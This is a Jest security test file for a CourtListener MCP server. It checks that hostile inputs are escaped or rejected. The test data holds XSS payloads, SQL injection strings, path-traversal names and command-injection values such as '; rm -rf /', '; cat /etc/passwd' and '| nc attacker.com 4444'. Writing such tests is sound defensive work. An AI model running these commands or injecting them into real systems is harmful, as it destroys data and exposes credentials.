/**
 * Container-Based Security Tests for CourtListener MCP
 * 
 * These tests run within the Docker container to validate security measures
 * in the actual deployment environment.
 */

import { spawn, ChildProcess } from 'child_process';

const TEST_TIMEOUT = 60000; // 1 minute per test

describe('Container Security Tests', () => {
  let mcpProcess: ChildProcess | null = null;
  let requestId = 1;

  beforeAll(async () => {
    console.log('🔒 Starting container security tests...');
    
    // Start MCP server
    mcpProcess = spawn('node', ['build/index.js'], {
      env: {
        ...process.env,
        NODE_ENV: 'test',
        DOCKER_CONTAINER: 'true'
      },
      stdio: ['pipe', 'pipe', 'pipe']
    });

    // Wait for server to be ready
    await new Promise<void>((resolve, reject) => {
      const timeout = setTimeout(() => {
        reject(new Error('MCP server startup timeout'));
      }, 10000);

      mcpProcess!.stdout!.on('data', (data) => {
        if (data.toString().includes('"method":"initialize"')) {
          clearTimeout(timeout);
          resolve();
        }
      });

      mcpProcess!.stderr!.on('data', (data) => {
        console.error('MCP stderr:', data.toString());
      });
    });

    console.log('✅ MCP server started for security testing');
  });

  afterAll(async () => {
    if (mcpProcess) {
      mcpProcess.kill();
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  });

  const sendMCPRequest = (method: string, params?: any): Promise<any> => {
    return new Promise((resolve, reject) => {
      if (!mcpProcess) {
        reject(new Error('MCP process not started'));
        return;
      }

      const request = {
        jsonrpc: '2.0',
        id: requestId++,
        method,
        params
      };

      const timeout = setTimeout(() => {
        reject(new Error('MCP request timeout'));
      }, 30000);

      const handleResponse = (data: Buffer) => {
        const response = data.toString().trim();
        if (response.includes(`"id":${request.id}`)) {
          clearTimeout(timeout);
          mcpProcess!.stdout!.removeListener('data', handleResponse);
          try {
            const parsed = JSON.parse(response);
            resolve(parsed);
          } catch (error) {
            reject(new Error(`Failed to parse MCP response: ${response}`));
          }
        }
      };

      mcpProcess.stdout!.on('data', handleResponse);
      mcpProcess.stdin!.write(JSON.stringify(request) + '\n');
    });
  };

  test('Input sanitization - XSS prevention', async () => {
    const maliciousInputs = [
      '<script>alert("xss")</script>',
      '"><script>alert(1)</script>',
      'javascript:alert("xss")',
      '<img src=x onerror=alert(1)>',
      '${alert("xss")}',
      '#{alert("xss")}'
    ];

    for (const input of maliciousInputs) {
      try {
        const response = await sendMCPRequest('tools/call', {
          name: 'search-dockets',
          arguments: { case_name: input }
        });

        // Check that response doesn't contain unescaped malicious content
        const responseStr = JSON.stringify(response);
        expect(responseStr).not.toContain('<script>');
        expect(responseStr).not.toContain('javascript:');
        expect(responseStr).not.toContain('onerror=');
        
        console.log(`✅ XSS input safely handled: ${input.substring(0, 30)}...`);
      } catch (error) {
        // Errors are fine - they indicate the input was rejected
        console.log(`✅ Malicious input rejected: ${input.substring(0, 30)}...`);
      }
    }
  }, TEST_TIMEOUT);

  test('SQL injection prevention', async () => {
    const sqlInjectionInputs = [
      "'; DROP TABLE users; --",
      "1' OR '1'='1",
      "' UNION SELECT * FROM users --",
      "'; DELETE FROM users; --",
      "1' OR 1=1 --",
      "admin'--",
      "' OR 1=1#"
    ];

    for (const input of sqlInjectionInputs) {
      try {
        const response = await sendMCPRequest('tools/call', {
          name: 'search-dockets',
          arguments: { case_name: input }
        });

        // Response should not contain SQL keywords or be malformed
        const responseStr = JSON.stringify(response);
        expect(responseStr).not.toContain('DROP TABLE');
        expect(responseStr).not.toContain('DELETE FROM');
        expect(responseStr).not.toContain('UNION SELECT');
        
        console.log(`✅ SQL injection input safely handled: ${input.substring(0, 30)}...`);
      } catch (error) {
        console.log(`✅ SQL injection input rejected: ${input.substring(0, 30)}...`);
      }
    }
  }, TEST_TIMEOUT);

  test('Rate limiting enforcement', async () => {
    const rapidRequests = Array.from({ length: 20 }, (_, i) => 
      sendMCPRequest('tools/call', {
        name: 'list-courts',
        arguments: { limit: 1 }
      })
    );

    // Some requests should succeed, but rate limiting should kick in
    const results = await Promise.allSettled(rapidRequests);
    const successful = results.filter(r => r.status === 'fulfilled').length;
    const failed = results.filter(r => r.status === 'rejected').length;

    console.log(`📊 Rapid requests: ${successful} successful, ${failed} failed/limited`);
    
    // We expect at least some to succeed and some rate limiting to occur
    expect(successful).toBeGreaterThan(0);
    expect(successful).toBeLessThan(20); // Rate limiting should prevent all from succeeding
  }, TEST_TIMEOUT);

  test('Command injection prevention', async () => {
    const commandInjectionInputs = [
      '; cat /etc/passwd',
      '| whoami',
      '& ls -la',
      '; rm -rf /',
      '`id`',
      '$(whoami)',
      '; curl malicious-site.com',
      '| nc attacker.com 4444'
    ];

    for (const input of commandInjectionInputs) {
      try {
        const response = await sendMCPRequest('tools/call', {
          name: 'search-dockets',
          arguments: { case_name: input }
        });

        // Response should not contain command outputs
        const responseStr = JSON.stringify(response);
        expect(responseStr).not.toContain('root:');
        expect(responseStr).not.toContain('uid=');
        expect(responseStr).not.toContain('/bin/');
        
        console.log(`✅ Command injection input safely handled: ${input.substring(0, 30)}...`);
      } catch (error) {
        console.log(`✅ Command injection input rejected: ${input.substring(0, 30)}...`);
      }
    }
  }, TEST_TIMEOUT);

  test('Parameter validation - invalid tool names', async () => {
    const invalidToolNames = [
      '../../../etc/passwd',
      '../../../../proc/version',
      'system("rm -rf /")',
      'eval("malicious code")',
      '__proto__',
      'constructor',
      'toString'
    ];

    for (const toolName of invalidToolNames) {
      try {
        const response = await sendMCPRequest('tools/call', {
          name: toolName,
          arguments: {}
        });

        // Should return an error for invalid tool names
        expect(response.error).toBeDefined();
        console.log(`✅ Invalid tool name rejected: ${toolName}`);
      } catch (error) {
        console.log(`✅ Invalid tool name caused safe error: ${toolName}`);
      }
    }
  }, TEST_TIMEOUT);

  test('Memory and resource limits', async () => {
    // Test large payload handling
    const largeString = 'A'.repeat(100000); // 100KB string
    
    try {
      const response = await sendMCPRequest('tools/call', {
        name: 'search-dockets',
        arguments: { case_name: largeString }
      });

      // Should handle gracefully or reject oversized inputs
      if (response.error) {
        console.log('✅ Large payload properly rejected');
      } else {
        console.log('✅ Large payload handled without crash');
      }
    } catch (error) {
      console.log('✅ Large payload caused controlled error (good)');
    }
  }, TEST_TIMEOUT);

  test('Environment variable access protection', async () => {
    // Try to access environment variables through various methods
    const envAccessAttempts = [
      '${ENV_VAR}',
      '#{ENV_VAR}',
      '$(env)',
      '`env`',
      'process.env',
      '$HOME',
      '$PATH'
    ];

    for (const attempt of envAccessAttempts) {
      try {
        const response = await sendMCPRequest('tools/call', {
          name: 'search-dockets',
          arguments: { case_name: attempt }
        });

        // Response should not contain actual environment variable values
        const responseStr = JSON.stringify(response);
        expect(responseStr).not.toContain(process.env.HOME || '');
        expect(responseStr).not.toContain(process.env.PATH || '');
        expect(responseStr).not.toContain(process.env.COURTLISTENER_API_TOKEN || '');
        
        console.log(`✅ Environment access attempt safely handled: ${attempt}`);
      } catch (error) {
        console.log(`✅ Environment access attempt rejected: ${attempt}`);
      }
    }
  }, TEST_TIMEOUT);

  test('JSON parsing security', async () => {
    // Test various JSON injection attempts
    const malformedJsonAttempts = [
      '{"__proto__": {"polluted": true}}',
      '{"constructor": {"prototype": {"polluted": true}}}',
      '{"toString": "function() { return \\"hacked\\"; }"}',
      '{"valueOf": "function() { return \\"hacked\\"; }"}'
    ];

    for (const jsonAttempt of malformedJsonAttempts) {
      try {
        // This would be parsed by the MCP server internally
        const response = await sendMCPRequest('tools/call', {
          name: 'search-dockets',
          arguments: { case_name: jsonAttempt }
        });

        console.log(`✅ Malformed JSON safely processed: ${jsonAttempt.substring(0, 30)}...`);
      } catch (error) {
        console.log(`✅ Malformed JSON rejected: ${jsonAttempt.substring(0, 30)}...`);
      }
    }
  }, TEST_TIMEOUT);

  test('Container isolation verification', async () => {
    // Verify we're running in the expected container environment
    const isDocker = process.env.DOCKER_CONTAINER === 'true';
    expect(isDocker).toBe(true);

    // Check that sensitive paths are not accessible
    const fs = require('fs');
    const sensitivePaths = [
      '/etc/shadow',
      '/etc/passwd',
      '/proc/version',
      '/etc/hosts'
    ];

    let accessiblePaths = 0;
    for (const path of sensitivePaths) {
      try {
        fs.accessSync(path, fs.constants.R_OK);
        accessiblePaths++;
      } catch {
        // Good - path is not accessible
      }
    }

    console.log(`📊 Container environment: ${accessiblePaths}/${sensitivePaths.length} sensitive paths accessible`);
    
    // Some paths like /etc/hosts might be accessible in containers, which is normal
    expect(accessiblePaths).toBeLessThan(sensitivePaths.length);
  }, TEST_TIMEOUT);

  test('API token validation', async () => {
    // Test with various invalid API token formats
    const invalidTokens = [
      '',
      'invalid',
      '1234567890',
      'a'.repeat(100),
      'null',
      'undefined',
      '${API_TOKEN}',
      '../../../token'
    ];

    // This test verifies the server handles invalid tokens gracefully
    // without exposing the real token or crashing
    
    for (const token of invalidTokens) {
      try {
        // The server should validate tokens internally
        // We can't directly test token validation from here,
        // but we can ensure requests with bad auth don't crash the server
        const response = await sendMCPRequest('tools/call', {
          name: 'list-courts',
          arguments: { auth_token: token }
        });

        console.log(`✅ Invalid token handled gracefully: ${token.substring(0, 10)}...`);
      } catch (error) {
        console.log(`✅ Invalid token rejected properly: ${token.substring(0, 10)}...`);
      }
    }
  }, TEST_TIMEOUT);
});
